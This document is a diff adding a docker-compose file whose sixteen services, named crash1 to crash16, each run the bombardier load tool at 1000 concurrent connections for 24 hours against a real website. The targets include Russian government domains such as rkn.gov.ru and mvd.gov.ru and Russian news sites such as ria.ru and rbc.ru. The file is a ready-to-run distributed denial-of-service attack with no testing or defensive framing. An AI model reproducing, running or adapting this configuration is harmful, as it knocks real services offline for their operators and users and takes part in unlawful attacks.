@@ -1,0 +1,51 @@
+version: "3.9"
+services:
+        crash1:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://mail.rkn.gov.ru"
+        crash2:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://cloud.rkn.gov.ru"
+        crash3:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://mvd.gov.ru"
+        crash4:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://pwd.wto.economy.gov.ru"
+        crash5:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://stroi.gov.ru"
+        crash6:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://ria.ru"
+        crash7:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://gazeta.ru"
+        crash8:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://kp.ru"
+        crash9:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://riafan.ru"
+        crash10:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://pikabu.ru"
+        crash11:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://kommersant.ru"
+        crash12:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://mk.ru"
+        crash13:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://yaplakal.com"
+        crash14:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://rbc.ru"
+        crash15:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://bezformata.com"
+        crash16:
+                image: alpine/bombardier
+                command: "-c 1000 -t 2s -l -d 24h https://shop-rt.com"
+
